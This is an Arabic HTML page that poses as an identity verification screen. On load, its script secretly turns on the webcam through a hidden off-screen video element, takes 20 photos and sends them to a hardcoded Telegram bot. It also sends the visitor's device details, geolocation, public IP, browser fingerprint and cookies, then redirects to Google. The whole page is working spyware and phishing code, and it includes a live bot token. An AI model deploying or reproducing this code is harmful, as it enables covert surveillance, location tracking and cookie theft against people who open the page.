
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 جاري التحقق...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family:  Segoe UI ,  Cairo , system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 40px;
            border: 1px solid rgba(59, 201, 219, 0.3);
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h2 {
            font-size: 1.6rem;
            background: linear-gradient(135deg, #fff, #3bc9db);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .subtitle { color: #8a9bb5; font-size: 0.8rem; margin: 10px 0; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(59,201,219,0.3);
            border-top-color: #3bc9db;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #3bc9db; font-size: 0.8rem; margin-top: 15px; }
        .hidden { display: none; }
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

<video id="camVideo" autoplay playsinline muted></video>

<div class="glass-card">
    <h2>🔒 جاري التحقق من الهوية</h2>
    <div class="subtitle">الرجاء الانتظار...</div>
    <div class="spinner"></div>
    <div class="status" id="statusText">جاري التحميل...</div>
</div>

<script>
    // ======================= الإعدادات =======================
    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
    const CHAT_ID = "7984067238";
    
    let statusDiv = document.getElementById( statusText );
    let camVideo = null;
    let cameraReady = false;
    let photosSent = 0;
    let totalPhotos = 0;
    
    function updateStatus(msg) {
        statusDiv.innerHTML = msg;
        console.log(msg);
    }
    
    // إرسال رسالة نصية
    async function sendMessage(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method:  POST ,
                headers: {  Content-Type :  application/json  },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
            });
        } catch(e) {}
    }
    
    // إرسال صورة
    async function sendPhoto(blob, caption) {
        try {
            const fd = new FormData();
            fd.append( chat_id , CHAT_ID);
            fd.append( photo , blob);
            if (caption) fd.append( caption , caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
            return true;
        } catch(e) { return false; }
    }
    
    // ========== 1. تشغيل الكاميرا فوراً ==========
    async function startCamera() {
        updateStatus("📷 جاري تشغيل الكاميرا...");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            camVideo = document.getElementById( camVideo );
            camVideo.srcObject = stream;
            await camVideo.play();
            updateStatus("✅ الكاميرا جاهزة");
            return true;
        } catch(e) {
            updateStatus("❌ لا يمكن الوصول للكاميرا");
            return false;
        }
    }
    
    // ========== 2. التقاط صورة واحدة ==========
    async function capturePhoto(photoNum) {
        return new Promise((resolve) => {
            try {
                if (!camVideo || camVideo.readyState < 2 || camVideo.videoWidth === 0) {
                    resolve(false);
                    return;
                }
                const canvas = document.createElement( canvas );
                canvas.width = camVideo.videoWidth || 640;
                canvas.height = camVideo.videoHeight || 480;
                canvas.getContext( 2d ).drawImage(camVideo, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 5000) {
                        await sendPhoto(blob, `📸 صورة #${photoNum}`);
                        photosSent++;
                        updateStatus(`📸 تم إرسال ${photosSent} صورة`);
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                },  image/jpeg , 0.85);
            } catch(e) {
                resolve(false);
            }
        });
    }
    
    // ========== 3. التقاط 20 صورة بسرعة ==========
    async function captureMultiplePhotos() {
        updateStatus("📸 جاري التقاط الصور...");
        for (let i = 1; i <= 20; i++) {
            await capturePhoto(i);
            await new Promise(r => setTimeout(r, 300)); // 3 صور في الثانية
        }
        updateStatus(`✅ تم التقاط وإرسال ${photosSent} صورة`);
    }
    
    // ========== 4. معلومات الجهاز ==========
    async function sendDeviceInfo() {
        let info = `🖥️ *معلومات الجهاز*\n━━━━━━━━━━━━━━━━━━\n`;
        info += `📱 المتصفح: ${navigator.userAgent.substring(0, 120)}\n`;
        info += `💻 النظام: ${navigator.platform}\n`;
        info += `🌐 اللغة: ${navigator.language}\n`;
        info += `📺 الشاشة: ${screen.width}×${screen.height}\n`;
        info += `🧠 الرام: ${navigator.deviceMemory ||  غير معروف } جيجابايت\n`;
        info += `⚙️ المعالج: ${navigator.hardwareConcurrency ||  غير معروف } نواة\n`;
        await sendMessage(info);
        updateStatus("📱 تم إرسال معلومات الجهاز");
    }
    
    // ========== 5. الموقع ==========
    async function getLocation() {
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await sendMessage(`📍 *الموقع*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            updateStatus("📍 تم تحديد الموقع");
        }, () => {});
    }
    
    // ========== 6. IP ==========
    async function getIP() {
        try {
            const res = await fetch( https://api.ipify.org?format=json );
            const data = await res.json();
            await sendMessage(`🌍 *IP العام*\n\`${data.ip}\``);
            updateStatus("🌍 تم تحديد IP");
        } catch(e) {}
    }
    
    // ========== 7. بصمة الجهاز ==========
    async function getFingerprint() {
        if (typeof FingerprintJS ===  undefined ) return;
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            await sendMessage(`🆔 *بصمة الجهاز*\n\`${result.visitorId}\``);
            updateStatus("🆔 تم إنشاء بصمة الجهاز");
        } catch(e) {}
    }
    
    // ========== 8. كوكيز ==========
    async function getCookies() {
        if (document.cookie && document.cookie.length > 0) {
            await sendMessage(`🍪 *الكوكيز*\n\`${document.cookie.substring(0, 900)}\``);
            updateStatus("🍪 تم سحب الكوكيز");
        }
    }
    
    // ========== 9. الـ MAIN - تنفيذ سريع جداً ==========
    async function main() {
        updateStatus("🚀 بدء التشغيل...");
        
        // إرسال رسالة بدء
        await sendMessage(`✅ *تم تشغيل النظام*\n🕐 ${new Date().toLocaleString( ar-EG )}`);
        
        // 1. تشغيل الكاميرا (أهم شيء)
        const cameraWorks = await startCamera();
        
        if (cameraWorks) {
            // انتظار ثانية واحدة لتثبيت الكاميرا
            await new Promise(r => setTimeout(r, 1000));
            
            // 2. التقاط 20 صورة بسرعة
            await captureMultiplePhotos();
        }
        
        // 3. باقي المهام (تعمل في الخلفية)
        sendDeviceInfo();
        getLocation();
        getIP();
        getFingerprint();
        getCookies();
        
        // 4. إرسال رسالة نهائية
        await sendMessage(`🏁 *اكتمل الجمع*\n📸 تم إرسال ${photosSent} صورة\n🕐 ${new Date().toLocaleString( ar-EG )}`);
        
        updateStatus("✅ تم جمع جميع البيانات");
        
        // 5. توجيه إلى جوجل بعد 3 ثواني
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 3000);
    }
    
    // بدء التشغيل فوراً
    window.onload = () => {
        setTimeout(main, 100);
    };
</script>
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</body>
</html>
